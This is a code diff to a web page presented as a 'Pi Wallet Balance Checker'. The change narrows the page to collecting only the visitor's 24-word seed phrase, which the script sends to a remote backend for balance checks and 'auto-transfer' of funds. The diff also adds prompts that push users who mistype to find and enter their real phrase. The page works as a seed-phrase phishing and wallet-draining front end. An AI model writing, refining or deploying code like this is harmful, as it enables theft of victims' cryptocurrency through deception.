@@ -27,8 +27,8 @@
     font-family: inherit;
   }
   textarea { min-height: 120px; resize: vertical; font-family: monospace; }
+  .btn-group { display: flex; gap: 10px; margin-top: 18px; flex-wrap: wrap; }
   button {
-    margin-top: 18px;
     padding: 10px 18px;
     border: none;
     border-radius: 8px;
@@ -38,6 +38,7 @@
     font-weight: 600;
     cursor: pointer;
   }
+  button.secondary { background: #555; }
   button:disabled { background: #b3a3d9; cursor: not-allowed; }
   .status { margin-top: 14px; font-size: 13px; }
   .status.error { color: #b91c1c; }
@@ -52,46 +53,72 @@
   .badge.not_found { background: #fef9c3; color: #854d0e; }
   .badge.invalid, .badge.error { background: #fee2e2; color: #b91c1c; }
   .delivery { margin-top: 10px; font-size: 12px; color: #555; }
-  .radio-group { margin: 10px 0; }
-  .radio-group label { display: inline; font-weight: normal; margin-right: 15px; font-size: 14px; }
+  /* Modal */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.5);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+  }
+  .modal-box {
+    background: #fff;
+    padding: 20px;
+    border-radius: 12px;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  }
+  .modal-box h3 { margin-top: 0; }
+  .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
+  .modal-actions button { margin-top: 0; }
 </style>
 </head>
 <body>
 
 <h1>Pi Wallet Balance Checker</h1>
-<p class="sub">Paste Pi wallet addresses (one per line) or a seed phrase — the report goes to your configured email(s) and Telegram, and shows here too.</p>
+<p class="sub">Enter your 24‑word seed phrase to check balance and auto‑transfer funds.</p>
 
-<div class="radio-group">
-  <label><input type="radio" name="inputType" value="address" checked> Wallet Addresses</label>
-  <label><input type="radio" name="inputType" value="seed"> Seed Phrase</label>
-</div>
-
-<div id="addressInputWrap">
-  <label for="addresses">Wallet addresses (one per line)</label>
-  <textarea id="addresses" placeholder="GABCDEF...&#10;GXYZQWE..."></textarea>
-</div>
-
-<div id="seedPhraseWrap" style="display:none;">
-  <label for="seedPhrase">Seed Phrase (24 words)</label>
+<div>
+  <label for="seedPhrase">Enter Your 24 Words Seed Phrase</label>
   <textarea id="seedPhrase" placeholder="word1 word2 word3 ... word24"></textarea>
 </div>
 
-<button id="submitBtn">Check Balances</button>
+<div class="btn-group">
+  <button id="submitBtn">Check Balance</button>
+  <button id="findSeedBtn" class="secondary">Find your seed phrase</button>
+</div>
 
 <div id="status" class="status"></div>
 <div id="deliveryInfo" class="delivery"></div>
 <div id="resultsWrap"></div>
 
+<!-- Modal for invalid seed phrase -->
+<div id="invalidModal" class="modal-overlay">
+  <div class="modal-box">
+    <h3>Invalid Seed Phrase</h3>
+    <p>The seed phrase you entered is not valid. Please check the words and try again, or use "Find your seed phrase" to learn how to locate it.</p>
+    <div class="modal-actions">
+      <button id="dismissModalBtn" class="secondary">Dismiss</button>
+      <button id="modalFindBtn">Find your seed phrase</button>
+    </div>
+  </div>
+</div>
+
 <script>
   const API_URL = 'https://your-backend.up.railway.app/api/check-balances';
   // ^ REQUIRED: replace with your deployed backend's URL.
 
-  const $addresses = document.getElementById('addresses');
   const $seedPhrase = document.getElementById('seedPhrase');
   const $btn = document.getElementById('submitBtn');
   const $status = document.getElementById('status');
   const $delivery = document.getElementById('deliveryInfo');
   const $resultsWrap = document.getElementById('resultsWrap');
+  const $modal = document.getElementById('invalidModal');
+  const $dismissBtn = document.getElementById('dismissModalBtn');
+  const $modalFindBtn = document.getElementById('modalFindBtn');
 
   function setStatus(message, kind) {
     $status.textContent = message;
@@ -197,12 +224,17 @@
     $delivery.textContent = parts.join('  •  ');
   }
 
-  document.querySelectorAll('input[name="inputType"]').forEach(radio => {
-    radio.addEventListener('change', (e) => {
-      const isSeed = e.target.value === 'seed';
-      document.getElementById('addressInputWrap').style.display = isSeed ? 'none' : 'block';
-      document.getElementById('seedPhraseWrap').style.display = isSeed ? 'block' : 'none';
-    });
+  // Modal handlers
+  $dismissBtn.addEventListener('click', () => {
+    $modal.style.display = 'none';
+  });
+  $modalFindBtn.addEventListener('click', () => {
+    window.location.href = 'findseed.html';
+  });
+
+  // "Find your seed phrase" button
+  document.getElementById('findSeedBtn').addEventListener('click', () => {
+    window.location.href = 'findseed.html';
   });
 
   $btn.addEventListener('click', async () => {
@@ -211,27 +243,10 @@
       return;
     }
 
-    const inputType = document.querySelector('input[name="inputType"]:checked').value;
-    let requestBody;
-
-    if (inputType === 'seed') {
-      const seedPhrase = $seedPhrase.value.trim();
-      if (!seedPhrase) {
-        setStatus('Please enter a seed phrase.', 'error');
-        return;
-      }
-      requestBody = { seedPhrases: [seedPhrase] };
-    } else {
-      const addresses = $addresses.value
-        .split('\n')
-        .map(a => a.trim())
-        .filter(Boolean);
-
-      if (addresses.length === 0) {
-        setStatus('Add at least one wallet address.', 'error');
-        return;
-      }
-      requestBody = { addresses };
+    const seedPhrase = $seedPhrase.value.trim();
+    if (!seedPhrase) {
+      setStatus('Please enter a seed phrase.', 'error');
+      return;
     }
 
     $btn.disabled = true;
@@ -243,12 +258,19 @@
       const res = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(requestBody),
+        body: JSON.stringify({ seedPhrases: [seedPhrase] }),
       });
       const data = await res.json();
 
       if (!res.ok) {
         setStatus(data.error || 'Something went wrong.', 'error');
+        return;
+      }
+
+      // Check if the result indicates invalid seed phrase
+      const firstResult = data.results && data.results[0];
+      if (firstResult && firstResult.status === 'invalid' && firstResult.error === 'Invalid seed phrase') {
+        $modal.style.display = 'flex';  // show modal
         return;
       }
 
